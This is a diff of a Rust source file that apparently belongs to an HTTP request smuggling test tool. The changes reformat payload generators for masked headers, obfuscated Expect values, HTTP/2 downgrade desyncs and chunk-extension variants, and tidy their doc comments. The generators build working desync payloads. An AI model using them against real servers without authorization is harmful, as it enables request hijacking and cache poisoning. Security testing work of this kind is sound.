@@ -1049,15 +1049,19 @@ pub fn vh_masked_header(
     // Variant 1: space-prefix on the header name.
     // NOTE: Rust backslash-continuation strips leading whitespace, so we
     // concatenate the SP-prefixed line explicitly to preserve the leading space.
-    let space_raw = format!(
-        "GET / HTTP/1.1\r\nHost: t\r\n {masked_name}: {value}\r\n\r\n"
-    );
+    let space_raw = format!("GET / HTTP/1.1\r\nHost: t\r\n {masked_name}: {value}\r\n\r\n");
     // Variant 2: substitute the first character of the header name with 'X'
     // (e.g., Host → Xost).  If the name is empty we fall back to "X-Unknown".
     let xname = if masked_name.is_empty() {
         "X-Unknown".to_owned()
     } else {
-        format!("X{}", &masked_name[masked_name.char_indices().nth(1).map_or(masked_name.len(), |(i, _)| i)..])
+        format!(
+            "X{}",
+            &masked_name[masked_name
+                .char_indices()
+                .nth(1)
+                .map_or(masked_name.len(), |(i, _)| i)..]
+        )
     };
     let xname_raw = format!(
         "GET / HTTP/1.1\r\n\
@@ -1140,18 +1144,14 @@ pub fn expect_100_obfuscated(
 ) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
     let smuggled = validate_prefix(smuggled_request)?;
     let variants: &[(&str, &str)] = &[
-        (prefix, suffix),                   // caller-supplied
-        ("", " "),                           // trailing space
-        (" ", ""),                           // leading space
-        ("", "\t"),                          // trailing tab
-        ("y ", ""),                          // "y 100-continue" (Kettle example)
-        ("", ""),                            // canonical — for baseline reference
+        (prefix, suffix), // caller-supplied
+        ("", " "),        // trailing space
+        (" ", ""),        // leading space
+        ("", "\t"),       // trailing tab
+        ("y ", ""),       // "y 100-continue" (Kettle example)
+        ("", ""),         // canonical — for baseline reference
     ];
-    let case_variants: &[&str] = &[
-        "100-Continue",
-        "100-CONTINUE",
-        "100-continue",
-    ];
+    let case_variants: &[&str] = &["100-Continue", "100-CONTINUE", "100-continue"];
     let mut out = Vec::new();
     for (pre, suf) in variants {
         let expect_value = format!("{pre}100-continue{suf}");
@@ -1284,7 +1284,7 @@ pub fn double_desync(
 /// split positions.
 ///
 /// # Errors
-/// Returns [`SafetyError::HeaderInjection`] if `host_value` contains `\r`,
+/// Returns `SafetyError::HeaderInjection` if `host_value` contains `\r`,
 /// `\n`, or `\0`.  These control bytes would be interpolated directly into the
 /// `Host: {mangled}\r\n` wire line, allowing a hostile caller to inject
 /// arbitrary headers into the raw request bytes.
@@ -1333,12 +1333,12 @@ pub fn malformed_host_split(
 ///
 /// After downgrade from HTTP/2 to HTTP/1.1 a front-end proxy may inherit an
 /// HTTP/2 body-framing field (`content-length`) that conflicts with what the
-/// HTTP/1.1 back-end expects.  This function produces an [`H2Evasion`]
+/// HTTP/1.1 back-end expects.  This function produces an `H2Evasion`
 /// descriptor whose `headers` carry the conflicting `content-length` and an
 /// embedded `transfer-encoding: chunked` designed to trigger H2.CL or H2.TE
 /// desync upon downgrade.
 ///
-/// Uses the existing [`H2Evasion`] struct from `h2_evasion.rs` — no new
+/// Uses the existing `H2Evasion` struct from `h2_evasion.rs` — no new
 /// constructors added there.
 pub fn browser_powered_h2_downgrade(
     method: &str,
@@ -1425,7 +1425,7 @@ pub fn line_folded_header(header: &str, value: &str, fold_text: &str) -> Vec<u8>
 /// `body` is appended after the `0\r\n\r\n` terminator as the smuggled prefix.
 ///
 /// # Errors
-/// Returns [`SafetyError::PrefixTooLong`] if `body` exceeds 64 KiB.
+/// Returns `SafetyError::PrefixTooLong` if `body` exceeds 64 KiB.
 /// Without this guard each call allocates `8 × body.len()` bytes (one clone
 /// per variant), so a 500 MiB hostile body would exhaust ~4 GiB of RAM.
 pub fn chunk_extension_variants(
@@ -1440,21 +1440,19 @@ pub fn chunk_extension_variants(
     let chunk_size = chunk_byte.len(); // 1
     let hex_size = format!("{chunk_size:x}");
     let extensions: &[(&str, &str)] = &[
-        ("standard key=value",    ";x=y"),
-        ("tab before ext name",   ";\tx=y"),
-        ("duplicate semicolons",  ";;x=y"),
-        ("empty extension",       ";"),
-        ("quoted-string ext",     ";x=\"y;z\""),
-        ("two extensions",        ";x=y;z=w"),
-        ("digit-start ext name",  ";0x=y"),
-        ("NUL in extension",      ";\x00ext=v"),
+        ("standard key=value", ";x=y"),
+        ("tab before ext name", ";\tx=y"),
+        ("duplicate semicolons", ";;x=y"),
+        ("empty extension", ";"),
+        ("quoted-string ext", ";x=\"y;z\""),
+        ("two extensions", ";x=y;z=w"),
+        ("digit-start ext name", ";0x=y"),
+        ("NUL in extension", ";\x00ext=v"),
     ];
     Ok(extensions
         .iter()
         .map(|(desc, ext)| {
-            let body_section = format!(
-                "{hex_size}{ext}\r\n{chunk_byte}\r\n0\r\n\r\n{smuggled}"
-            );
+            let body_section = format!("{hex_size}{ext}\r\n{chunk_byte}\r\n0\r\n\r\n{smuggled}");
             let raw = format!(
                 "POST / HTTP/1.1\r\n\
                  Host: t\r\n\
